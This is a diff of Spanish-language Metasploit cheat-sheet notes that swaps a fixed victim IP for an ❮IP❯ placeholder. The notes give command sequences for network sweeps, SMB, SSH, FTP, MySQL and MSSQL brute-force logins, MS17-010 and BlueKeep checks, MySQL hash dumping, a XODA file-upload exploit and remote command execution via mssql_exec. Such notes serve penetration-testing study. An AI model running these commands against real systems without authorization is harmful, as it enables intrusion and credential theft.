@@ -11,7 +11,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ❯ use auxiliary/scanner/discovery/arp_sweep      # Para usar el exploit
 ❯ options                                        # Miramos las opciones del exploit y ver lo que es necesario cargar para hacer el barrido en la subred
 ❯ info 'o' info -d                               # Nos da una breve descripcion de lo que hace el exploit
-❯ set RHOSTS 192.168.68.0/24                     # Colocamos la subred en donde queremos hacer el barrido del ARP
+❯ set RHOSTS ❮IP.0/24❯                     # Colocamos la subred en donde queremos hacer el barrido del ARP
 ❯ run
 ❯ hosts                                          # Nos muestra los hosts que ha descubierto en el reconocimiento
 ❯ services                                       # Nos muestra los servicios, pero para que sea mas efectivo, debemos de pasarle el archivo XML de Nmap
@@ -27,7 +27,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search portscan                             
 	❯ use auxiliary/scanner/portscan/tcp          # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ set PORTS 1-1000
 	❯ run 
 ```
@@ -39,7 +39,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search xoda                             
 	❯ use exploit/unix/webapp/xoda_file_upload       # Usamos el exploit
 	❯ options
-	❯ set RHOSTS 192.168.1.194                       # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
 	❯ set TARGETURI /
 	❯ exploit                                        
 ```
@@ -51,7 +51,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search portscan                             
 	❯ use auxiliary/scanner/discovery/upd_sweep          # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                    # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -64,7 +64,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search portscan                             
 	❯ use auxiliary/scanner/ftp/ftp_version           # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                        # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                 # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -75,12 +75,12 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search portscan                             
 	❯ use auxiliary/scanner/ftp/ftp_login           # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                      # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                               # Colocamos la IP de la maquina victima
 	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt       # Agregamos la lista de usuarios 
 	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt     # Agregamos la lista de passwds 
 	❯ run 
 
-	❯ ftp <IP>         # Una vez encontrado el usuario:passwd podemos ingresar al servicio FTP desde MSF
+	❯ ftp ❮IP❯         # Una vez encontrado el usuario:passwd podemos ingresar al servicio FTP desde MSF
 ```
 
 ```bash 
@@ -90,10 +90,10 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search portscan                             
 	❯ use auxiliary/scanner/ftp/anonymous           # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                      # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                               # Colocamos la IP de la maquina victima
 	❯ run  
 
-	❯ ftp <IP>                                      # Podemos ingresar como anonimo desde MSF
+	❯ ftp ❮IP❯                                      # Podemos ingresar como anonimo desde MSF
 ```
 
 ## Puerto 445 SMB 
@@ -105,7 +105,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ search smb                                  
 	❯ use auxiliary/scanner/smb/smb_version       # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -115,7 +115,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/smb/smb2              # Usamos el auxiliar
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -125,7 +125,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/smb/smb_enumusers     # Usamos el auxiliar
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -135,7 +135,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/smb/smb_enumshares    # Usamos el auxiliar
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -145,7 +145,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
 	❯ options
-	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
 	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
 	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
 	❯ set VERBOSE false
@@ -167,7 +167,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ options
 	❯ set smbuser <admin>
 	❯ set smbpass <passwd>
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -179,7 +179,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/http_version      # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -189,7 +189,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/http_header      # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -199,7 +199,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/robots_txt        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -209,7 +209,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/dir_scanner        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                      # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                               # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -219,7 +219,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/files_dir         # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -229,7 +229,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/brute_dirs        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -241,7 +241,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ options
 	❯ set AUTH_URI /secure/                                  # Directorio donde nos autenticamos
 	❯ unset USERPASS_FILE                                    # Quitas la ruta  
-	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
 	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
 	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 	❯ set VERBOSE false
@@ -258,7 +258,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/apache_userdir_enum        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
 	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 	❯ run 
 ```
@@ -271,7 +271,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/smb/smb_ms17_010      # Usamos el auxiliar
 	❯ options
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -283,7 +283,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/ssh/ssh_version        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -296,7 +296,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
 	❯ set STOP_ON_SUCCESS true
-	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ set VERBOSE true
 	❯ run 
 
@@ -310,7 +310,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/ssh/ssh_enumusers      # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 	❯ run 
 ```
@@ -323,7 +323,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/http/apache_mod_cgi_bash_env     # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -335,7 +335,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/mysql/mysql_version      # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -343,12 +343,12 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 # Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico, en este caso el usuario 'root'
 ❯ msfconsole -q                                    # q = Quitar el banner de inicio
 
-	❯ use auxiliary/scanner/mysql/mysql_login         # Usamos el auxiliar
+	❯ use auxiliary/scanner/mysql/mysql_login     # Usamos el auxiliar
 	❯ options
 	❯ set USERNAME root
 	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 	❯ set STOP_ON_SUCCESS true
-	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ setg RHOSTS ❮IP❯                            # Colocamos la IP de la maquina victima
 	❯ set verbose false
 	❯ run 
 ```
@@ -359,7 +359,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/mysql/mysql_enum                  # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
 	❯ set USERNAME root
 	❯ set PASSWORD ""                                       # Colocamos la Passwd valida 
 	❯ run
@@ -371,10 +371,10 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/mysql/mysql_sql                  # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                      # Colocamos la IP de la maquina victima
 	❯ set USERNAME root
-	❯ set PASSWORD ""                                       # Colocamos la Passwd valida 
-	❯ set SQL show databases;                               # Colocamos una Query con estructura valida 
+	❯ set PASSWORD ""                                      # Colocamos la Passwd valida 
+	❯ set SQL show databases;                              # Colocamos una Query con estructura valida 
 	❯ run
 ```
 
@@ -384,7 +384,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/mysql/mysql_schemadump             # Usamos el auxiliar 
 	❯ options
-	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ setg RHOSTS ❮IP❯                                         # Colocamos la IP de la maquina victima
 	❯ set USERNAME root
 	❯ set PASSWORD ""
 	❯ run
@@ -396,7 +396,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/mysql/mysql_writable_dirs        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
 	❯ set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
 	❯ set VERBOSE false
 	❯ advanced                                               # Mirar las opciones avanzadas
@@ -411,7 +411,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/mysql/mysql_file_enum            # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
 	❯ set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
 	❯ set USERNAME root
 	❯ set PASSWORD ""
@@ -424,7 +424,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/mysql/mysql_hashdump             # Usamos el auxiliar 
 	❯ options
-	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ setg RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
 	❯ set USERNAME root
 	❯ set PASSWORD ""
 	❯ run 
@@ -447,7 +447,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ options
 	❯ set user_file /root/Desktop/wordlists/common_users.txt
 	❯ set pass_file /root/Desktop/wordlists/100-common-passwords.txt
-	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ setg RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
 	❯ set verbose false
 	❯ run 
 ```
@@ -458,7 +458,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/mssql/mssql_enum            # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                 # Colocamos la IP de la maquina victima
 	❯ run
 ```
 
@@ -468,7 +468,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/mssql/mssql_enum_sql_logins       # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
 	❯ run
 ```
 
@@ -478,7 +478,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/mssql/mssql_enum_domain_accounts       # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                            # Colocamos la IP de la maquina victima
 	❯ run
 ```
 
@@ -488,7 +488,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/mssql/mssql_exec                  # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                       # Colocamos la IP de la maquina victima
 	❯ set cmd whoami                                        # Colocamos el comando a ejecutar 
 	❯ run
 ```
@@ -501,7 +501,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/rdp/rdp_scanner        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ set RPORT 3333                               # Configuramos el puerto de RDP en caso que no use el de default 3389
 	❯ run 
 ```
@@ -516,7 +516,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep        # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                                # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                         # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -528,7 +528,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/scanner/smtp/smtp_version      # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
 	❯ run 
 ```
 
@@ -538,7 +538,7 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 
 	❯ use auxiliary/admin/smtp/smtp_enum                  # Usamos el auxiliar 
 	❯ options
-	❯ set RHOSTS 192.168.1.194                            # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                                     # Colocamos la IP de la maquina victima
 	❯ run
 ```
 
